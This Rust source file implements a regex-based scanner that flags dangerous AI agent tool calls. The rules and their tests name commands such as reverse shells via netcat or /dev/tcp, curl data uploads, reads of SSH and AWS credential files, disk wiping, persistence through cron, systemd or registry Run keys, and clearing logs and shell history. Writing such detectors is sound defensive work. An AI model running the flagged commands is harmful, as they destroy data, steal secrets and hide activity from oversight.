// SPDX-License-Identifier: GPL-3.0-only
use crate::detectors::evidence::{detection_from_matches, L1Component, L1Match};
use crate::detectors::NativeDetection;
use crate::threat::is_template_env_copy;
use crate::EvaluationResult;
use regex::Regex;
use serde_json::Value;
use std::sync::OnceLock;

/// Severity of a MCP tool policy violation.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum McpSeverity {
    Medium,
    High,
    Critical,
}

/// Result of a policy scan for a single tool call.
#[derive(Debug, Clone)]
pub struct McpPolicyViolation {
    pub rule_name: &'static str,
    pub severity: McpSeverity,
}

/// Raw (uncompiled) rule definition.
struct McpPolicyRuleDef {
    name: &'static str,
    tool_pattern: &'static str,
    arg_pattern: &'static str,
    severity: McpSeverity,
}

struct CompiledMcpRule {
    name: &'static str,
    tool_re: Regex,
    arg_re: Regex,
    severity: McpSeverity,
}

/// All MCP tool policy rules
static MCP_RULES: &[McpPolicyRuleDef] = &[
    // ── Destruktive Dateioperationen ─────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_rm_rf",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)\brm\s+(--\s+)?(-[a-z]*[rf]\b|--(?:recursive|force)\b)",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_chmod_recursive",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)\b(chmod\s+(-R|--recursive)\s+(777|666)|chmod\s+(777|666)\s+(-R|--recursive)|chown\s+(-R|--recursive))\b",
        severity: McpSeverity::High,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_disk_wipe",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)\b(dd\s+if=.*of=/dev/|mkfs\.|fdisk)\b",
        severity: McpSeverity::Critical,
    },
    // ── Credential-Zugriff via Tool ──────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_credential_file_read",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|read_file|file_read)$",
        arg_pattern: r"(?i)(\.ssh/(id_|authorized)|\.aws/credentials|\.env\b|\.netrc|/etc/shadow)",
        severity: McpSeverity::Critical,
    },
    // ── Netzwerk-Exfiltration ────────────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_exfil_curl_wget",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)\b(curl|wget)\b.*(-d\s|--data|--upload-file|-T\s|-X\s+POST|--post-data)",
        severity: McpSeverity::High,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_reverse_shell",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)(bash\s+-i\s+>&|/dev/tcp/|mkfifo\s+|nc\s+-e|ncat\s+-e)",
        severity: McpSeverity::Critical,
    },
    // ── Package Installation ─────────────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_pkg_install",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)\b(pip|npm|gem|cargo|go)\s+install\b",
        severity: McpSeverity::Medium,
    },
    // ── Destruktive Git-Operationen ──────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_git_destructive",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|git)$",
        arg_pattern: r"(?i)(\bgit\s+)?(push\s+(--force(\s|$)|-f\b)|reset\s+--hard\b|clean\s+-fd\b)",
        severity: McpSeverity::Critical,
    },
    // ── Encoded Command Execution ────────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_encoded_cmd",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)(\beval\b.*\bbase64\b|\bbase64\s+(-d|--decode)\b.*\|\s*(ba)?sh\b)",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_windows_encoded_powershell",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|cmd|powershell|pwsh)$",
        arg_pattern: r"(?i)\b(powershell(?:\.exe)?|pwsh(?:\.exe)?)\b.*-(enc|encodedcommand)\b|\b-(enc|encodedcommand)\b\s+[A-Za-z0-9+/=]{8,}",
        severity: McpSeverity::Critical,
    },
    // ── Cron / Systemd Persistence ───────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_cron_persistence",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)(\bcrontab\s+(-\w+\s+\S+\s+)*-e\b|\bcrontab\s+[^-\s]|>\s*/(?:var/spool/cron|etc/cron)|\|\s*crontab\b)",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_cron_path_write",
        tool_pattern: r"(?i)^(write_file|file_write|edit_file|create_file|modify_file|append_file)$",
        arg_pattern: r"(?i)(/etc/crontab\b|/etc/cron\.(d|daily|hourly|weekly|monthly)/|/var/spool/cron/|/etc/init\.d/|/etc/systemd/|/lib/systemd/|/Library/Launch(?:Daemons|Agents)/)",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_systemd_enable",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)\bsystemctl\s+(-{1,2}\w+\s+)*(enable|daemon-reload)\b",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_windows_scheduled_task",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|cmd|powershell|pwsh)$",
        arg_pattern: r"(?i)\bschtasks(?:\.exe)?\s+/create\b",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_windows_run_key",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|cmd|powershell|pwsh|write_file|file_write|edit_file|create_file|modify_file|append_file)$",
        arg_pattern: r"(?i)(\breg(?:\.exe)?\s+add\s+)?HK(?:CU|LM)\\+Software\\+Microsoft\\+Windows\\+CurrentVersion\\+Run(?:Once)?\b|\bSoftware\\+Microsoft\\+Windows\\+CurrentVersion\\+Run(?:Once)?\b",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_windows_service_create",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|cmd|powershell|pwsh)$",
        arg_pattern: r"(?i)(\bNew-Service\b|\bsc(?:\.exe)?\s+create\b)",
        severity: McpSeverity::Critical,
    },
    // ── Shell-Profile-Manipulation ───────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_shell_profile_write",
        tool_pattern: r"(?i)^(write_file|file_write|edit_file|create_file|modify_file|append_file)$",
        arg_pattern: r"(?i)((?:^|/)\.(bashrc|bash_profile|profile|zshrc|zprofile|zshenv|bash_logout)\b|/etc/profile\b)",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_shell_profile_cmd",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)(>>\s*[^\|;&]*\.(bashrc|bash_profile|profile|zshrc|zprofile|zshenv)\b|\balias\s+\w+=|>>\s*[^\|;&]*/etc/profile\b)",
        severity: McpSeverity::Critical,
    },
    // ── Prozess-Detachment ────────────────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_detached_process",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec)$",
        arg_pattern: r"(?i)(\bnohup\s+|\bdisown\b|\bsetsid\s+|\bscreen\s+(-\S+\s+)*-[dDm]|\btmux\s+(new-session|new)\s+-d)",
        severity: McpSeverity::High,
    },
    // ── Audit-Log-Manipulation ───────────────────────────────────────────────
    McpPolicyRuleDef {
        name: "pi_mcp_log_tamper",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|write_file|file_write|edit_file)$",
        arg_pattern: r"(?i)(\b(rm|truncate|shred)\b[^\|;&]*/var/log/|\b(rm|truncate|shred)\b[^\|;&]*\.(log|audit|jsonl)\b|>\s*[^\|;&]*/var/log/|\bhistory\s+-c\b|\bunset\s+HISTFILE\b|\bexport\s+HISTFILE=/dev/null\b)",
        severity: McpSeverity::Critical,
    },
    McpPolicyRuleDef {
        name: "pi_mcp_windows_event_log_tamper",
        tool_pattern: r"(?i)^(bash|shell|exec|run_command|execute|terminal|bash_exec|cmd|powershell|pwsh)$",
        arg_pattern: r"(?i)\bwevtutil(?:\.exe)?\s+(cl|clear-log)\b",
        severity: McpSeverity::Critical,
    },
];

pub struct McpToolPolicyScanner {
    rules: Vec<CompiledMcpRule>,
}

impl McpToolPolicyScanner {
    pub fn new() -> Self {
        let rules = MCP_RULES.iter().filter_map(compile_rule).collect();
        Self { rules }
    }

    fn matches<'a>(
        &'a self,
        tool_name: &str,
        arguments: &str,
    ) -> Vec<(&'a CompiledMcpRule, L1Match)> {
        self.rules
            .iter()
            .flat_map(|rule| {
                let tool = rule.tool_re.find(tool_name);
                rule.arg_re
                    .captures_iter(arguments)
                    .filter_map(move |captures| {
                        let tool = tool?;
                        if rule.name == "pi_mcp_credential_file_read"
                            && is_template_env_copy(&arguments.to_ascii_lowercase())
                        {
                            return None;
                        }
                        let mut matched = L1Match::from_captures(&rule.arg_re, &captures, None);
                        // Tool and argument offsets belong to separate inputs here. detect_text
                        // maps the tool component to the enclosing source document.
                        matched
                            .components
                            .insert(0, L1Component::new("tool", tool.range()));
                        Some((rule, matched))
                    })
            })
            .collect()
    }

    pub fn scan_text(&self, text: &str) -> Vec<McpPolicyViolation> {
        let Some((tool, _)) = tool_name_from_text(text) else {
            return Vec::new();
        };
        self.scan_tool_call(&tool, text)
    }

    pub fn scan_tool_call(&self, tool_name: &str, arguments: &str) -> Vec<McpPolicyViolation> {
        let mut seen = std::collections::HashSet::new();
        self.matches(tool_name, arguments)
            .into_iter()
            .filter_map(|(rule, _)| {
                seen.insert(rule.name).then_some(McpPolicyViolation {
                    rule_name: rule.name,
                    severity: rule.severity,
                })
            })
            .collect()
    }

    fn detect_text(&self, text: &str) -> NativeDetection {
        let Some((tool, source)) = tool_name_from_text(text) else {
            return detection_from_matches(text, "dlp_mcp_policy", "safe", Vec::new());
        };
        let mut detection = detection_from_matches(text, "dlp_mcp_policy", "safe", Vec::new());
        let mut rules = Vec::new();
        for (rule, mut matched) in self.matches(&tool, text) {
            matched.components[0] = L1Component::new("tool", source.clone());
            let one = detection_from_matches(text, rule.name, rule.name, vec![matched]);
            if detection.evidence_spans.is_empty() {
                detection.result = one.result;
            }
            detection.evidence_spans.extend(one.evidence_spans);
            rules.extend(
                one.details["matched_rules"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .cloned(),
            );
        }
        detection
            .details
            .insert("matched_rules".into(), serde_json::json!(rules));
        detection
    }
}

/// Retain the raw source range of a root-level tool field, including escaped JSON.
/// Never locate a decoded value by searching for a coincidental occurrence.
fn tool_name_from_text(text: &str) -> Option<(String, std::ops::Range<usize>)> {
    let trimmed = text.trim_start();
    if !trimmed.starts_with('{') {
        let token = first_token(trimmed)?;
        let start = trimmed.as_ptr() as usize - text.as_ptr() as usize;
        return Some((token.into(), start..start + token.len()));
    }
    let value: Value = serde_json::from_str(trimmed).ok()?;
    let object = value.as_object()?;
    let (key, tool) = ["tool_name", "tool", "name", "command"]
        .into_iter()
        .find_map(|key| {
            object
                .get(key)
                .and_then(Value::as_str)
                .map(|tool| (key, tool))
        })?;
    let tool = first_token(tool)?.to_string();
    static STRINGS: OnceLock<Regex> = OnceLock::new();
    let strings = STRINGS.get_or_init(|| Regex::new(r#""(?:\\.|[^"\\])*""#).unwrap());
    let mut depth = 0_i32;
    let mut cursor = 0;
    let mut tokens = strings.find_iter(text).peekable();
    while let Some(token) = tokens.next() {
        for c in text[cursor..token.start()].chars() {
            match c {
                '{' | '[' => depth += 1,
                '}' | ']' => depth -= 1,
                _ => {}
            }
        }
        cursor = token.end();
        if depth == 1
            && serde_json::from_str::<String>(token.as_str())
                .ok()
                .as_deref()
                == Some(key)
        {
            let next = tokens.peek()?;
            if text[token.end()..next.start()].trim() == ":" {
                return Some((tool, next.start() + 1..next.end() - 1));
            }
        }
    }
    None
}

fn first_token(text: &str) -> Option<&str> {
    text.split_whitespace()
        .next()
        .filter(|token| !token.is_empty())
}

impl Default for McpToolPolicyScanner {
    fn default() -> Self {
        Self::new()
    }
}

pub fn shared_mcp_tool_policy_scanner() -> &'static McpToolPolicyScanner {
    static SCANNER: OnceLock<McpToolPolicyScanner> = OnceLock::new();
    SCANNER.get_or_init(McpToolPolicyScanner::new)
}

fn compile_rule(def: &McpPolicyRuleDef) -> Option<CompiledMcpRule> {
    let tool_re = match Regex::new(def.tool_pattern) {
        Ok(regex) => regex,
        Err(_) => return None,
    };
    let arg_re = match Regex::new(def.arg_pattern) {
        Ok(regex) => regex,
        Err(_) => return None,
    };

    Some(CompiledMcpRule {
        name: def.name,
        tool_re,
        arg_re,
        severity: def.severity,
    })
}

pub struct McpPolicyPipeline {
    scanner: McpToolPolicyScanner,
}

impl McpPolicyPipeline {
    pub fn new() -> Self {
        Self {
            scanner: McpToolPolicyScanner::new(),
        }
    }

    pub(crate) fn detect(&self, text: &str) -> NativeDetection {
        self.scanner.detect_text(text)
    }

    pub fn evaluate(&self, text: &str) -> EvaluationResult {
        self.detect(text).result
    }

    pub fn evaluate_batch(&self, texts: &[String]) -> Vec<EvaluationResult> {
        use rayon::prelude::*;
        texts.par_iter().map(|t| self.evaluate(t)).collect()
    }
}

impl Default for McpPolicyPipeline {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn every_mcp_rule_retains_tool_and_argument_evidence_in_de_and_en_documents() {
        let cases = [
            ("pi_mcp_rm_rf", "bash", "rm -rf /tmp/task-data"),
            (
                "pi_mcp_chmod_recursive",
                "bash",
                "chmod -R 777 /tmp/task-data",
            ),
            ("pi_mcp_disk_wipe", "bash", "fdisk /dev/test"),
            (
                "pi_mcp_credential_file_read",
                "read_file",
                "/tmp/task/.aws/credentials",
            ),
            (
                "pi_mcp_exfil_curl_wget",
                "bash",
                "curl https://example.test --data hello",
            ),
            (
                "pi_mcp_reverse_shell",
                "bash",
                "nc -e /bin/sh example.test 4242",
            ),
            ("pi_mcp_pkg_install", "bash", "pip install example"),
            ("pi_mcp_git_destructive", "git", "reset --hard"),
            ("pi_mcp_encoded_cmd", "bash", "eval base64"),
            (
                "pi_mcp_windows_encoded_powershell",
                "powershell",
                "powershell -enc YWJjZGVmZ2g=",
            ),
            ("pi_mcp_cron_persistence", "bash", "crontab -e"),
            (
                "pi_mcp_cron_path_write",
                "write_file",
                "/etc/cron.d/example",
            ),
            ("pi_mcp_systemd_enable", "bash", "systemctl enable example"),
            (
                "pi_mcp_windows_scheduled_task",
                "cmd",
                "schtasks /create /tn example",
            ),
            (
                "pi_mcp_windows_run_key",
                "cmd",
                "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ),
            (
                "pi_mcp_windows_service_create",
                "powershell",
                "New-Service example",
            ),
            (
                "pi_mcp_shell_profile_write",
                "write_file",
                "/tmp/task/.bashrc",
            ),
            (
                "pi_mcp_shell_profile_cmd",
                "bash",
                "echo test >> /tmp/task/.bashrc",
            ),
            ("pi_mcp_detached_process", "bash", "nohup example"),
            ("pi_mcp_log_tamper", "bash", "history -c"),
            (
                "pi_mcp_windows_event_log_tamper",
                "cmd",
                "wevtutil cl Application",
            ),
        ];
        let expected = MCP_RULES
            .iter()
            .map(|r| r.name)
            .collect::<std::collections::BTreeSet<_>>();
        assert_eq!(expected, cases.iter().map(|c| c.0).collect());
        let scanner = McpToolPolicyScanner::new();
        for (id, tool, arguments) in cases {
            for description in ["Führe diesen Werkzeugaufruf aus.", "Run this tool call."] {
                let text = serde_json::json!({"description": description, "tool": tool, "arguments": arguments}).to_string();
                let detection = scanner.detect_text(&text);
                let rule = detection.details["matched_rules"]
                    .as_array()
                    .unwrap()
                    .iter()
                    .find(|r| r["rule_id"] == id)
                    .unwrap_or_else(|| panic!("{id}: {text}"));
                let components = rule["components"].as_array().unwrap();
                assert!(components.len() >= 2);
                let tool_component = &components[0];
                let start = tool_component["start_byte"].as_u64().unwrap() as usize;
                let end = tool_component["end_byte"].as_u64().unwrap() as usize;
                assert_eq!(&text[start..end], tool);
                assert!(!detection.evidence_spans.is_empty());
            }
        }
    }

    #[test]
    fn tool_offsets_ignore_nested_and_duplicate_values_and_preserve_escaped_source() {
        let scanner = McpToolPolicyScanner::new();
        let text = r#"{"metadata":{"tool":"read_file"},"description":"bash","tool":"ba\u0073h","arguments":"rm -rf /tmp/task"}"#;
        let detection = scanner.detect_text(text);
        let rule = &detection.details["matched_rules"][0];
        let tool = &rule["components"][0];
        let start = tool["start_byte"].as_u64().unwrap() as usize;
        let end = tool["end_byte"].as_u64().unwrap() as usize;
        assert_eq!(&text[start..end], r"ba\u0073h");
        assert_eq!(detection.result.class_name, "pi_mcp_rm_rf");
        assert!(scanner
            .detect_text(r#"{"tool":"read_file","arguments":"public-report.txt"}"#)
            .evidence_spans
            .is_empty());
    }
}
